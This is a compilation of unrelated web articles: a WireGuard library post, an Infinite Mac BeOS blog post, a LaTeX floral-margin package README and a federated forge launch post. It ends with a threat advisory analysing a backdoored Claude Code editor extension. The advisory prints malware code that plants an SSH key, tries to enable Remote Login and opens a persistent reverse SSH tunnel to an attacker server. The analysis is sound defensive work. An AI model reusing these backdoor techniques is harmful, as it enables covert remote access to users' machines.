The owner thread only does the bookkeeping, while encryption and decryption run on worker threads.
Being a sans-IO library, sanstun doesn't concern itself with how exactly you want to parallelize your crypto. If you want to keep it simple, you can also just call encrypt and decrypt inline and not bother with parallelization at all.
The key thing we wanted to achieve with sanstun's API design was to enable parallel crypto while keeping everything around Interface single-threaded. This lets the internal rate limiter work without locks or atomic counters and take advantage of Rust's borrow checker, all while combining state from multiple tunnels.
Closing
With sanstun, our fork at firezone/boringtun is now deprecated. If you are building on top of WireGuard, whether that's a VPN, a mesh network or something else entirely, we hope sanstun makes your life a little easier. It is available on crates.io.
sanstun is open source under the Apache 2.0 license. Check it out on GitHub; issues and pull requests are welcome!

title: persistent.info: Infinite Mac: BeOS
content:
tl;dr: You can now run many BeOS versions in the browser at Infinite Mac, my site where you can experience the Macintosh Cinematic Universe from 1984 to 2005. The installs are full peers to their Mac cousins: you can boot them instantly (large disks are streamed in), play around with pre-installed software from Infinite HD, insert CD-ROMs from the Internet Archive, and save your work on the “Saved HD” drive.
BeOS was a multimedia-focused, multi-tasking and multi-threaded OS that was eventually ported to the Power Macintoshes of the mid-90s. It impressed many in the Mac community, including Apple itself, who considered acquiring Be, the company that had created it. If you’ve been following the saga of Apple’s search for a next-generation operating system, this lets you see what the road not taken was like.
Getting BeOS Running
After the last somewhat involved (though still satisfying) project on Infinite Mac, I was looking for a quicker win. BeOS had been on my radar for a while, and (unlike A/UX) I had a personal connection to it: I remember spotting a BeBox in Akihabara, making my Mac cosplay as it with BeView, and eventually dual-booting BeOS on my Power Macintosh 8500. DingusPPC, an emulator I had already integrated, was making good progress on running BeOS, so it seemed like adding it to the site would be mostly a matter of preparing some additional disk images.
Initially it appeared to be as straightforward as I had hoped; I added a Power Macintosh 7300 configuration (one of the Power Macs that was officially supported), found an install CD, made a disk image, and was up and running. But as I used it more and started to install additional versions, I began to find a lot of small bugs and edge cases:
The BeOS boot loader thought that all modifier keys were being held down due to a bug in the ADB emulation; this made it present the (ugly, PC BIOS-like) partition choice screen every time.
When changing the screen depth, there are two hardware components that need to be notified: the video controller and the digital-to-analog converter. DingusPPC had been accidentally relying on the order that Mac OS sent these notifications in; BeOS happened to make the opposite choice and would end up with a corrupted display.
Early versions of BeOS did video memory updates in little-endian mode1; DingusPPC was missing support for that hardware capability.
Later versions of BeOS could mount HFS partitions, but they were having trouble with the volumes that I generated via the machfs Python library. It turned out that BeOS was (correctly) stricter than Mac OS about how some data structures should be populated.
And so on – most of the commits that I upstreamed to DingusPPC over the past month were in a quest for better BeOS compatibility.

The best of both worlds?
SheepShaver, a Power Macintosh emulator that is still around today (and that Infinite Mac also embeds), originated on BeOS. Mostly for the fun of another layer of inception/emulation, I wanted to make sure that it worked too. As it turned out, it also required a compatibility fix – it relied on an edge case of how the ROM is mapped to physical memory addresses that DingusPPC did not accurately model.
There is a pattern to most of these bug fixes: DingusPPC (and Infinite Mac) have been mostly focused on running Mac OS, and thus accidentally became dependent on its quirks or implementation choices. Adding an independently developed operating system to the mix exercised new paths, and ended up improving the accuracy of the emulated hardware. To be clear, DingusPPC was pretty close out of the box; kudos to its maintainers. I believe that, with this work, it’s the only emulator2 that can run PowerPC versions of BeOS. I’m also hopeful that this will help with bringing up alternate operating systems like MkLinux (which I also have memories of) and Rhapsody.
On the Infinite Mac side, there were obvious changes like a “BeOS” appearance for my custom controls and collecting software for the library. I also needed to overlay some dynamically generated content on the disk to get the OS to preselect a screen resolution that matches the browser window’s (similar to what was done for A/UX). An AI agent (still Codex for me) was once again helpful for this type of fiddly reverse-engineering task: it’s one thing to observe that the OS stores a file on disk with the screen size; it’s another to be able to reproduce all its nuances, especially as the format changed with later releases.
Developer Release 8.2, the initial BeOS version for Power Macs, had a time bomb that kept it from booting after April 1, 1997. This was not just to create a sense of urgency; it shipped with a licensed font renderer that Be could not distribute indefinitely. DR8.3 addressed this, but to make that notable first version bootable, I did end up relying on the custom date support to hardcode a working date when choosing that disk.
BeOS Impressions
Though I did kick the tires of BeOS back when it was current, I don’t recall using it enough to form any opinions beyond “this is fast; I miss all my third-party software.” About This Particular Macintosh does have contemporary coverage, including Be’s first and second appearances at Macworld Expo Boston, and reviews of R3 and R4.5; they make for interesting reading. This video released by Be itself also has a walkthrough of what they considered its strengths.
Looking at it with 2026 eyes, I am still struck by its speed – it’s fast to boot and to use, especially when compared with its contemporary Mac OS releases that do so much less (e.g. live window dragging did not appear until Mac OS X). The POSIX subsystem and the Unix-like shell also feel modern (unlike A/UX’s) – I had no trouble using the terminal to poke around. There’s also plenty of innovation, though some of it (BFS with its attributes and live queries) is more interesting than the rest (replicants are a precursor to widgets, but I couldn’t think of a use for them).
It also feels like a developer-focused and under-construction system: many of the included apps are technology demos (though who doesn’t love a Utah teapot), while a contemporary Be homepage links directly to the developer release notes and discusses CodeWarrior releases and access to the bug tracker. The unfinished nature extends to third-party software too – I stumbled across some BeOS software on this Amiga magazine CD, and most of it had a “version 0.1” feel, either literally or figuratively. To be fair, I did find some more fleshed-out software, for example, Gobe Productive from the former ClarisWorks team. This and other software is on Infinite HD if you’d like to try it out (preferably in later OS versions).
The interface seemed novel at the time, though I wonder how it would have held up3. The distinctive tabbed window titles look neat, but they have a reduced draggable area, so I’d have to think harder every time I wanted to move a window. And using a hand as the default cursor makes clicking feel less precise than a traditional arrow (just which of the pixels on the “finger” is the hotspot?). Other parts of the UI feel like a not-fully-coherent Windows/Mac hybrid, with a Deskbar that can emulate a Start menu4, Alt key accelerators on menu items, but also spring-loaded folders and a spatial Finder Tracker.
Speaking of the Tracker, I had not realized that Be had open-sourced it (and even incorporated changes from the open-source version). This was around the time that Be pivoted away to internet appliances – there’s no need to invest engineering resources in a file manager if all that’s exposed is one full-screen browser app. This interview with the Tracker developer has more of the backstory.

Do your own bake-off: NeXT vs. Be
NeXTStep, by comparison, feels more mature. It had gone through some similar churn (proprietary hardware to off-the-shelf PCs, company strategy shifts), but, perhaps because it had more time, it handled things a bit more gracefully. For example, NeXT supported “fat” binaries that could run on 68K, Intel, PA-RISC and other architectures. On BeOS they had to be separate executables, making the user choose which to run and complicating distribution (this made it harder for me to find software to include in Infinite HD). Worse yet, you also had to have parallel disk partitions on CD-ROMs: BFS used the host endianness, so disks written by a PowerPC install could not be read by an Intel one, or vice versa. But my pro-NeXT bias may be due to knowing which OS Apple ended up picking.
Other Site Improvements
It’s only been a short while since the last update, but I did squeeze in a couple of quality-of-life improvements. You can now take screenshots and record videos (with sound) of the emulated machine’s screen. This gives you a high-fidelity way to capture image content, since it’s a direct dump of what would have been shown on the screen.
I also expanded the collection of operating system CD-ROMs with items like the Rhapsody and Mac OS X developer previews. While they’re aspirational for now (DingusPPC can’t run them yet), they do satisfy my completionist tendencies. These CDs are mirrored to and served from my own Cloudflare R2 bucket – the Internet Archive is an incredible resource (you can donate to them), but streaming from it has been increasingly flaky. I don’t want to add to the problem, and thanks to my sponsors, I can afford to serve a few gigabytes.
As for what’s next, with this alternate Mac timeline covered, it may be time to explore a prequel.
TIL that this was possible – Apple generally ran the PowerPC and did everything on its machines in big-endian mode. There’s even a patent about this controller capability. ↩
Though while I was working on this, BeBox was vibed into existence. ↩
Then again it looks like Haiku has preserved it almost verbatim, so it definitely has a long-lasting appeal to some. ↩
If you can find the 3-pixel-wide draggable area to move it to the bottom. ↩

title: GitHub - kevinraymond/florilegium: Procedurally generated Delft-blue floral page margins for LuaLaTeX, drawn in Lua · GitHub
content:
florilegium
Origin
The Reddit post asked how to make flowers like these in LaTeX. I don't know how the original was made, and this project doesn't try to reproduce it. It is one possible way, and the way I did it: hand-authored primitives with randomized parameters, painted in Lua, placed by a procedural layout whose "fill the unused space" part borrows a 1998 idea from the ornament literature. It gets a similar look.
What it is
Procedurally generated Delft-blue floral page margins for LaTeX. No images, no imported paths, no external assets: every petal, leaf and stem is a parametric curve computed in Lua while the page is being written, painted like a watercolor, and written straight into the PDF. Every page gets its own garden.
Six seeds of the grown composition. Same code, different seed — and the garden fills whatever space the text leaves free.
Two documents share one package, and two more (showcase.tex, spread.tex) show what else it does:
florilegium.tex florilegium-grow.tex
composition authored: stems, leaves and flowers placed by hand, every parameter sampled grown: a plant grown to fit the page by a greedy space-filling loop
adapts to nothing (tuned for A4, 68 mm margin) the page layout, and the free space below the text on the last page
preview
Both PDFs are self-describing: the body text is the write-up of how the margin is drawn.
Last page of the grown document: the text ends early, so branches arch into the space below.
300 dpi crop. Mottled washes with white streaks lifted out, lobed leaves with white veins, forget-me-not cymes, a pale ghost flower behind the stems.
Watch it grow
as it grows with the free space it fills
Seed 6, from an empty margin to the finished page. The stems rise first, leaves open as the tips pass their nodes, and each stem ends in a flower. Then the greedy loop takes over: on the right, each dashed circle is the largest free disc it found, just before a branch grows to it. Big holes come first and slowly, small ones last and fast. The butterflies and bees fly in, the bird glides onto its twig, and the snail crawls up its stem until the last frame, which is exactly the page this seed always gives.
The growth is recorded once, while the page is laid out: each stem is also drawn as prefixes of increasing length and each motif at a few smaller scales, replaying the same random draws. A frame then writes the pieces whose time has come, in their original painting order. make grow-6 renders one seed this way (build/grow-6.gif and .mp4, about 45 seconds); add EXPLAIN=1 for the dashed circles.
The margin reads the text
showcase.tex, "A year in the margin": spring on the first page, summer, autumn on the last. Each section describes the feature it shows.
The grown margin can respond to the document around it:
Initials. \florilegiuminitial[5]{E} sets the first letter of a paragraph in a tile five lines tall. The outline of the letter is read from an OpenType font (Latin Modern Bold by default) and painted like a petal; a vine passes over and under its strokes in turn, with leaves where they fit and flowers in the gaps, often in the letter's counters. The letter is also typeset invisibly, so the paragraph still copies as "Every".
Flowers at the headings. With the option sections, every numbered section and subsection gets a flower in the margin beside its heading, painted in the copper of the accents, the way headings were once picked out in red.
A flower where the text asks. \florilegiumbloom puts a flower beside the line it stands in; \florilegiumbloom[lily] asks for any motif of the garden. The marks are found in the page box when the page is shipped out, so this works in one run.
Seasons. With the option aging, the garden ages from spring on the first page (mostly in bud, small pale leaves) to autumn on the last (seed heads, falling petals, a few copper leaves). It needs two runs, for the page count; \florilegiumage{0.8} sets an age by hand instead.
One seed in spring, early summer, late summer and autumn. The seasons change what grows, not where.
Visitors
Most pages have visitors: a butterfly or two and bees in the open spaces, a snail crawling up one of the main stems, and on about one page in five a bird perched on a twig of its own. They come from a random stream of their own, so a page without them is exactly the page it would have been; the option novisitors leaves them out.
Any ink
The whole palette comes from one color, ink: Delft blue, sepia, green, crimson, violet, teal. The ramp from the darkest stroke to the palest wash is computed from that hue in OKLCH, so the light end never turns gray.
Themes
Seed 6 three times: as it always grew, with theme=geometric, and with theme=math.
The growth loop never knew what it was drawing. It reads a table of motifs (the size of the disc each one takes, a weight, a function that draws it) and calls every primitive by name. A theme is one Lua file, theme-<name>.lua, that replaces some of those primitives and may add rows to the table, or brings a composition of its own.
theme=geometric is the same plant cut from flat shapes (theme-geometric.lua). It grows exactly as the flowers do, and only the drawing changes: the stems run straight between their nodes, the leaves are kites and toothed polygons folded into a light and a dark facet with straight white veins, the flowers are rosettes of rhombi or layered star polygons, the tendrils square spirals, the bird and the butterfly low-poly. The colors are flat tones of the ink, with no wash; crystals (Platonic solids, flat-shaded like cut stones) grow among the flowers. A page is about a tenth of the size of a flora page.
theme=math is no plant at all (theme-math.lua, drawing from figures.lua): mathematics cascading down the margin and across the bottom of the page, overlapping a little so it blends. A large figure sits in the corner where the column meets the bottom (an Apollonian gasket, a deep Koch snowflake, Vogel's disc, a polyhedron). Down the column run one or two families, figures that change as they go, joined by small copper arrows: the Koch snowflake gaining a level, a polygon gaining sides on its way to the circle, the cube truncating into the octahedron, chords k → mk mod n turning from a cardioid into a nephroid, Vogel's disc packing evenly only at the golden angle. Equations that hold (e^{iπ} + 1 = 0, V − E + F = 2, ...) run along the bottom and under the text on the last page, and everything else, largest hole first, is figures (Platonic solids, knots, Hilbert curves, Lissajous curves, hypotrochoids, Maurer roses, the Petersen graph, ...), letters, numerals and symbols set by TeX at many sizes and a slight tilt, and dots. It fills whatever space the page leaves, like the garden; density sets how much there is.
\usepackage[grown,theme=geometric]{florilegium}   % or theme=math; the whole document
\florilegiumtheme{math}                            % or from the page this stands on
A document without a theme comes out byte for byte as it did before themes existed.
Less in the margin
Seed 6 at density=1, 0.5, 0.2 and 0.05, and at intensity=0.5.
A full garden is a lot to have beside an equation. Two options turn it down, with any theme:
density=0.4 grows less: the loop stops at larger holes, keeps more paper around each motif, and hangs fewer leaves and fillers. Low on the dial the plant itself thins out: two main stems, then one, no footer; at 0.05 it is a single vine with its flower, a couple of leaves and one or two sprays. With the math theme it means fewer things.
intensity=0.5 paints the whole margin paler, the same way the ghost flowers behind the garden are painted. It changes only the color, not the detail.
\usepackage[grown,density=0.4,intensity=0.6]{florilegium}
At the defaults (1 and 1) every page is exactly the page it was before.
One ornament in the text
Or no margin at all: \florilegiumornament{leaf} sets one primitive in the line, in a box the size of a letter, for example to open a paragraph. Each ornament in a document gets a shape of its own and keeps it from one build to the next; seed=random draws a new one every time the PDF is built, and seed=7 a fixed one.
\usepackage[nomargin]{florilegium}       % ornaments only, no garden in the margin
\florilegiumornament{leaf} A paragraph that opens with a leaf.
\florilegiumornament[size=2.4em, ink=5B2A1F, angle=30, seed=random]{flower}
Any primitive works (leaf, leaflet, flower, blossom, bud, bell, lily, cyme, umbel, butterfly, bee, bird, hedera, sparkle, ...), and so do the current theme's (crystal with geometric; knot, polyhedron, koch, ... with math).
Both sides of the page
spread.tex, pages 2 and 3: a two-sided document with a wide outer margin. The garden grows on the left of the left-hand page and, mirrored, on the right of the right-hand page. The last page also switches to the geometric theme.
The garden grows in whichever side margin is wider, so there is nothing to set. In a two-sided document (twoside with a wide outer margin) it changes sides with the page. A one-sided document with a wide right margin gets it on the right of every page. A mirrored page is laid out as if seen in a mirror, then drawn through a reflection: the last transform that every point already passes through. It is exactly the reflection of the garden the same seed would grow on the left.
In PostScript
postscript/florilegium.ps: the grown margin in pure PostScript, one self-contained file. Ghostscript, or a printer, computes every petal while it interprets the page, and the two pages of text explain how.
The drawing core, every primitive and the growth loop are ported from ink.lua, flora.lua and grow.lua, procedure for procedure. It needs no TeX and no other file:
gs -dALLOWPSTRANSPARENCY -sDEVICE=pdfwrite -dSeed=7 -o garden.pdf postscript/florilegium.ps
make postscript             # the same -> build/postscript-7.pdf; SEED=12 for another garden
-dSeed=N picks the garden; without it the clock picks one, so every print is new. -dAge=0 to 1 sets the season, and -dNoVisitors leaves out the butterflies, bees, snail and bird. Two pages take about 2.5 seconds. Much of the Lua maps directly: PostScript's own transformation matrix places each primitive (translate, rotate, scale), paths and Bézier curves are native, and procedures built at run time stand in for Lua's closures (a petal's half-width is a procedure handed to the outline builder). Four things don't map:
Layers. The garden grows in one order but is painted back to front, so every fill and stroke is captured with pathforall into a list per layer, and the lists are played back at the end.
Transparency. PostScript has none. Ghostscript provides it with -dALLOWPSTRANSPARENCY. Without that flag, or on a printer, each translucent fill is mixed with the color it is likely to land on and painted opaque. The result is flatter, but it's the same garden.
Randomness. The generator is Park-Miller in 32-bit integer arithmetic, and PostScript reals are single precision, so seed 7 here is a different garden from seed 7 in LaTeX.
Text. The file typesets its own two pages in Times. It knows where its headings are and where its text ends, so the copper flowers at the headings and the garden under the last line work as they do in LaTeX. It has no initials, animation, themes, mirrored pages, density or intensity, ornaments in the text, or authored composition.
The file sent twice to an Epson inkjet with lp postscript/florilegium.ps, with no seed given. The computer's print system runs the program again for each job, so each print takes its seed from the clock and grows a different garden. A printer gets the opaque version, as it has no transparency.
Build
LuaLaTeX, one pass, about a second a page (two passes for showcase.tex, whose seasons need the page count).
make                        # the four PDFs
make seed-7                 # one page from seed 7 -> build/seed-7.pdf
make gallery                # gallery/seeds.png + seeds.gif, inks.png, seasons.png, themes.png, dials.png (python3, Pillow, pdftoppm)
make grow-6                 # growth animation of seed 6 -> build/grow-6.gif + .mp4 (ffmpeg)
make grow-6 EXPLAIN=1       # the same with the free discs marked -> build/grow-6-explain.*
No TeX installed? Build the image once and run everything in it:
docker build -t florilegium-tex tools
make RUN=tools/in-docker
Or paste florilegium.sty, the nine .lua files and one of the .tex files into an Overleaf project and set the compiler to LuaLaTeX.
Use it in your own document:
\usepackage[grown]{florilegium}      % or plain \usepackage{florilegium} for the authored one
% options for the grown one: sections (flowers at the headings), aging (two runs),
% novisitors (no butterflies, bees, snails or birds); for both: theme=geometric or theme=math,
% density=0.4 (grown only), intensity=0.6
% two-sided? nothing to set: the garden grows in the wider side margin
\definecolor{ink}{HTML}{5B2A1F}      % optional: the hue of the whole palette (this is sepia)
\definecolor{accent}{HTML}{B4662F}   % optional: the copper of the hairlines
...
\florilegiuminitial[4]{T}his paragraph starts with a decorated T.
... a flower in the margin beside this line\florilegiumbloom ...
\florilegiumage{0.8}                 % grown only: autumn from here on
\florilegiumtheme{geometric}         % another theme, from the page this stands on
\florilegiumornament{leaf}           % one leaf in the text, the size of a letter
\florilegiumtextend                  % grown only: at the very end of the text
A fixed seed instead of the page number: lualatex "\def\florilegiumseed{7}\input{florilegium-grow.tex}".
Any primitive can be drawn on its own inside a TikZ picture, under the current scope's shift, rotation and scale:
\begin{tikzpicture}
  \begin{scope}[shift={(2,2)},rotate=20]\florilegiumdraw{flower}{1.3}\end{scope}
  \begin{scope}[shift={(5,0)}]\florilegiumdraw{leaf}{3.0, {depth=0.6}}\end{scope}
  \begin{scope}[shift={(8,1)}]\florilegiumdraw{ghost}{"lily", {s=1.4}}\end{scope}
  \begin{scope}[shift={(11,1)}]\florilegiumdraw{butterfly}{1.5}\end{scope}
\end{tikzpicture}
With a theme, its primitives can be drawn by name too: \florilegiumdraw{crystal}{1.0} under theme=geometric (see specimen-geometric.tex), \florilegiumdraw{knot}{1.2} under theme=math.
How it works
Drawing (ink.lua). All geometry is computed in Lua and written as PDF path operators into one literal node per page; TeX does no arithmetic. Primitives are drawn in a local frame under an affine transform, which is read from TikZ when a primitive is called inside a scope. Colors come from a tone ramp derived from the one document color ink: navy to mist at the hue of ink, interpolated in OKLCH so the light end stays blue instead of turning gray. Tapered strokes are two offset Béziers, not sampled ribbons.
Primitives (flora.lua). Painted in the order a watercolorist would: a flat wash, darker blotches multiplied over it, pigment pooling at the edges, streaks lifted out in white, a few fine veins, an

title: Double Buffering with Cloudflare Queues
The federated code forge · The Tangled Blog
content:
The federated code forge
Anirudh
30 October 2026
For most of the past two decades, the code forge has been where projects live: where code is hosted, where changes are reviewed, and where contributors find each other. Forges offered convenience in exchange for centralisation.
But the centralised forge is crumbling. Relying on someone else for uptime, for features, and to be a good steward of your code hasn’t played out well. What has stood the test of time is email: Git to move the code, and email — an open protocol — to talk about it. At the cost of user experience, however.
Tangled aims to give you the best of both: the longevity of an open protocol, with the convenience and polish of a proper forge.
It’s the first truly federated code forge — you can host code on your own servers and still collaborate seamlessly with others. Our approach is pragmatic: self-host just the parts you want, like Git hosting or CI runners, or all of it, including the API server and UI. Whatever you choose, you can still talk to everyone else.
Owning your infrastructure also means you can hack on, extend and customise your forge as you see fit. Because Tangled is built on the AT Protocol, you can build your own extensions, subscribe to the firehose, or even write entirely custom knots, like this one that runs on Cloudflare Workers and uses their Artifacts product for git storage. Or an entirely custom spindle such as mitchellh.com/tack. Go even further and host our ultralight API server and build your own custom forge.
Agents have made building such hyper-personalized software trivial, and especially so when software is designed with hackability in mind from the get-go. Tangled is incredibly agent friendly.
The future of software engineering may be a moving target, but our bets on open protocols and developer agency give us the agility to move with it, and to become your code forge for the next decade.
Product updates
A fresh look!
The obvious big one: with this release, Tangled has a whole new look. We’ve redone the UI on top of our new architecture (described further below), in Svelte. Things should now be quicker, visually consistent and prettier! The keen eyed of you might’ve also spotted that we’ve swapped out Inter for Timeless Sans.
A bobbin near you
Until now, Tangled’s web UI and backend were a single Go monolith called the appview. The appview service handled AT Protocol indexing, caching, off-protocol data and UI rendering using html/template + htmx. It ran on a single SQLite database on one medium-sized server in Sweden.
This was great as long as you were ~50–100 ms away from Sweden, but most of our users aren’t! We rearchitected: we built a new standalone frontend app in Svelte, deployed at the edge. It is populated by our new diskless, entirely in-memory indexer service written in Rust: bobbin. Bobbins are deployed globally in over 11+ regions, ensuring users around the world get the best API and UI performance.
The astute reader might’ve noticed: bobbin is purely read-only and only deals with AT Protocol data. What of the rest? That functionality (and more) has been delegated to a new set of supporting services.
The new data model and repo-owned data
First, the data model itself: we have a new set of lexicons, and everything now lives under org.tangled.*, replacing the old sh.tangled.* records.
Knot2 is our aptly named, second implementation of the knot server, this time rewritten in Rust. Knot2 bakes a fully custom Git server, and also bundles in an SSH server in the same binary.
With knot2, we’ve also changed where some of that data lives. Issues, pull requests, comments, reactions and labels are now stored on the knot, right next to the code, as collaborative objects (COBs). A COB is just a chain of Git objects in the repo itself. Collaborators, knot members and the blocklist are also stored the same way.
In that sense, knots now behave a lot like a PDS: they hold signed records, full history included, for everything that belongs to a repo and much like a PDS, these records are synced via the standard AT Protocol firehose.
But why? A project’s issues and pull requests are as much a part of it as its code, so they should live with it, wherever you choose to host it. This gives your project maximum portability.
If the knot writes your issues and comments, what stops it from putting words in your mouth? Attestations. Every time you create or edit a record on a knot, the web app also writes an org.tangled.graph.attestation record to your own PDS, pointing at that exact version of the record and the COB change behind it. Two-way verification!
Self-hosters will have to upgrade their knots to the v1.20.0 by following the upgrade guide.
Organizations
Organization accounts are here! An Organization on Tangled is a real AT Protocol account, with its own DID and handle, hosted on a Tranquil PDS instance. They’re passwordless, delegated accounts: you create one from the New Organization page, and you get <name>.tngl.sh with yourself as its owner. Owners can invite members, and anyone in the Organization can act as it when creating or forking repositories. Like any other account, you can swap the handle out for a domain you own. If you’ve been running a regular account as a stand-in “org”, hang tight — we’re working on a way to move those over. Read more in the docs.
Stacked PRs for everyone
Our PR flow has been overhauled. The new flow gives everyone, regardless of whether you use Jujutsu or just vanilla Git, the ability to submit and review stacked PRs. If you’re using Git, you now get the ability to interdiff between versions (previously called rounds). JJ users get to interdiff between individual changes as well.
Launch weeks ahead
This isn’t all. We’re staggering this launch across the next few weeks. Up next are private repos, a CLI, SDKs for different languages and skills for your agent.
Until then, enjoy every part of this launch equally.
Your code, your network.
Come build with us on Tangled.
Sign up

title: Official Claude Code Extension Compromise: Security Advisory | Phorion
content:
October 30, 2026
Updated October 31, 2026
By Calum Hall
Official Claude Code Extension Compromise: Security Advisory
SSH Backdoor
Cursor Marketplace
VS Code
macOS
Linux
Windows
Threat Report
TL;DR
Phorion has detected a backdoor in the official Claude Code for VS Code extension bundle on the Cursor Marketplace that drops a persistent SSH backdoor across macOS, Linux, and Windows. This write-up focuses primarily on macOS, where the extension attempts to configure an SSH backdoor and establish persistence.
Organisations should immediately review their environments for use of Claude Code for VSCode 2.1.312 or 2.1.313 and engage incident response where use of the extension is discovered.
Update (31 October 2026): Cursor’s security notice now identifies versions 2.1.312 and 2.1.313 distributed through the Cursor Marketplace for macOS and Windows as affected. This advisory previously identified only 2.1.313; the affected-version guidance below has been updated accordingly.
Phorion has discovered a compromise of the official Claude Code for VS Code extension on the Cursor Marketplace, where the backdoored extension bundle contains a persistent Secure Shell (SSH) backdoor. Cursor has removed the affected versions, 2.1.312 and 2.1.313, from its marketplace.
While the implant includes setup and persistence logic for macOS, Linux, and Windows, we’re going to focus primarily on macOS in this post, calling out the key differences and a few implementation bugs on the other platforms along the way.
The Cursor Marketplace serves extensions for the Cursor editor. Because extensions run with the permissions of the IDE and the user running it, a backdoored extension gets immediate access to local files, source code, and developer tooling as soon as its module is loaded.
Notably, Phorion has discovered a likely oversight in how the malware tries to turn on SSH. The setup logic assumes it can check the current Remote Login state without root privileges. When run as a standard user, systemsetup -getremotelogin prints an administrator-access error and exits with status 0 instead of returning Off. Because the script only tries to enable SSH if the output matches Off, it skips the enablement step entirely. On a Mac that doesn’t already have SSH running, that mistake breaks the inbound access path, even though the SSH keys and persistence still get dropped.
In this post, we’ll walk through how the backdoor works, why that macOS check fails, and what to look for across your fleet. The goal of this payload is long-term interactive access, and whilst the SSH backdoor bug minimises impact on macOS, the malware is still a significant threat that installs persistence and beacons host reconnaissance back to the operator.
Infection Chain
The Cursor Marketplace Extension
The compromised extension.js file starts with an injected immediately invoked function expression (IIFE) prepended to the minified extension bundle. The rest of the bundle looks like the standard extension, with Claude Code and VS Code strings, normal activate and deactivate exports, and UI code.
The injected prefix pulls in standard Node.js modules (child_process, fs, os, path, http, and crypto) and executes as soon as Node loads the file, before the extension’s normal activate callback even runs. The user doesn’t need to interact with the extension for the payload to fire.
Stage 1 - Preparing SSH Access
First, the payload makes sure ~/.ssh exists and appends an attacker-controlled Ed25519 public key to ~/.ssh/authorized_keys, setting permissions to 0700 on the directory and 0600 on the file.
The key uses the comment svc-telemetry. Before appending, the script checks whether svc-telemetry is already in the file rather than checking for the key itself. When hunting for this activity, it’s worth checking the public-key fingerprint rather than relying solely on the comment string.
var sd = path.join(HOME, ".ssh"),
    ak = path.join(sd, "authorized_keys");
// ...
if (cur.indexOf("svc-telemetry") < 0) {
  fs.appendFileSync(ak, PUB + "\n");
  d.sshKey = "added"
} else {
  d.sshKey = "present"
}
Here, cur holds the existing contents of authorized_keys, and PUB is the embedded attacker public key (redacted here).
With the key in place, anyone holding the matching private key can authenticate as that user, provided SSH is actually running. The next step in the script tries to make sure the local SSH daemon is enabled and listening:
Linux: tries to enable and start sshd or ssh via systemctl, falling back to service and /etc/init.d/.
macOS: checks Remote Login and, if it reports Off, tries to enable it via sudo -n systemsetup -setremotelogin on.
Windows: tries to install and start OpenSSH Server using PowerShell.
None of these steps include a privilege escalation exploit. Non-interactive sudo -n will fail unless the user already has passwordless sudo cached or configured, so starting a system service won’t always succeed from a standard user context.
It looks like the Windows code path also has its own bug: it passes the PowerShell service setup command through a helper function (det()) that hardcodes /bin/sh, which isn’t going to get very far on a standard Windows install.
A bug in the macOS SSH logic?
On macOS, the setup may run into problems before it even gets to the sudo command. The script runs systemsetup -getremotelogin without elevation and tests the output against /Off/i. It only tries to enable Remote Login if the output contains Off:
// ...
else if (PLAT === "darwin") {
  var rl = ex("systemsetup -getremotelogin 2>/dev/null", 4000);
  d.remoteLogin = rl;
  if (/Off/i.test(rl)) {
    det("sudo -n systemsetup -setremotelogin on >/dev/null 2>&1");
    d.remoteLoginOn = "tried"
  }
}
Notice that the second command (-setremotelogin on) uses sudo -n, while the first command (-getremotelogin) doesn’t. When you run systemsetup -getremotelogin as a standard user on macOS, you get this instead:
You need administrator access to run this tool... exiting!
systemsetup refuses to read the setting without administrator privileges, prints the error to stdout, and exits with status 0. The malware’s ex() helper grabs stdout and returns it:
function ex(c, t) {
  try {
    return cp.execSync(c, {
      timeout: t || 3000,
      stdio: ["ignore", "pipe", "ignore"],
      windowsHide: true
    }).toString().trim()
  } catch (e) {
    return ""
  }
}
Because the output is "You need administrator access to run this tool... exiting!", /Off/i.test(rl) evaluates to false.
As a result, the script skips the if block and never runs sudo -n systemsetup -setremotelogin on. It effectively treats “I don’t have permission to check if SSH is off” as “SSH is already on”, which also explains why you won’t see the enablement attempt in process telemetry when the extension runs as a normal user.
This bug can break the final step of the access chain. If Remote Login isn’t already enabled on the Mac, the outbound tunnel can still connect to the attacker’s server, but any traffic forwarded back through the tunnel will hit a closed port 22 on localhost.
Of course, that isn’t something to rely on as a defence. If the user already had Remote Login enabled, or turns it on later, the backdoor is ready and waiting.
Stage 2 - Establishing the Reverse SSH Tunnel
Next, the script sets up an outbound SSH connection to 134.209.82[.]225 as the tunnel user on port 22. To authenticate to the attacker’s server, it decodes a separate embedded private key: an unencrypted OpenSSH Ed25519 key with the comment svc-telemetry-tun.
It’s worth keeping the two keys straight during an investigation:
The public key added to ~/.ssh/authorized_keys (svc-telemetry) lets the attacker log into the victim’s machine.
The embedded private key (svc-telemetry-tun) lets the victim’s machine connect out to the attacker’s tunnel server.
The script writes this tunnel key to the OS temporary directory with a filename starting with .stk_, followed by the first ten characters of the MD5 hash of the hostname and home directory path:
var kf = path.join(
  TMP,
  ".stk_" + crypto.createHash("md5")
    .update(String(os.hostname()) + HOME).digest("hex").slice(0, 10)
);
// ...
var RF = (PLAT === "win32") ? "\"*:0:localhost:22\"" : "'*:0:localhost:22'";
The tunnel uses -R *:0:localhost:22 for remote port forwarding. Passing 0 asks the attacker’s SSH server to dynamically allocate a listening port and forward any traffic hitting it back through the tunnel to localhost:22 on the victim’s machine:
Affected host -- outbound SSH tunnel --> External SSH server
Operator -- separate connection --> Server's allocated port
                                            |
                                 Through the existing tunnel
                                            |
                                            v
                                  Affected host's SSH:22
                                            |
                                  Login using the planted key
Because the tunnel runs with -N, it just holds the port forward open without executing a command on the remote server. When the operator wants to access the machine, they start a separate SSH session through the allocated port on their server, authenticating against the victim’s local SSH daemon using the key planted in Stage 1. That gives them a full interactive shell and file transfer capability without needing any custom C2 command handling in the JavaScript itself.
The SSH command also passes flags to keep the connection quiet and non-interactive: host-key checking is disabled, known_hosts is ignored, BatchMode and IdentitiesOnly are enabled, keepalives are set to 30 seconds (ServerAliveCountMax=3), and ExitOnForwardFailure is turned on.
If autossh is installed, the script uses it; otherwise it falls back to standard ssh. It wraps the connection in a detached retry loop that sleeps for 60 seconds between attempts, using pgrep on Unix systems to avoid spinning up duplicate initial tunnels. Because the loop is detached, the tunnel stays up even after the user closes their IDE.
Stage 3 - Keeping Access Available
To survive a reboot, the script sets up platform-specific persistence alongside the initial detached tunnel:
PLATFORM ARTIFACTS PERSISTENCE MECHANISM NOTES
Linux ~/.config/.smt, ~/.config/.smtk Writes a shell script that recreates the tunnel key and loops the SSH connection, then adds an @reboot entry to the user’s crontab. Contains a bug in the crontab check that can wipe existing user cron jobs on repeat runs (detailed below).
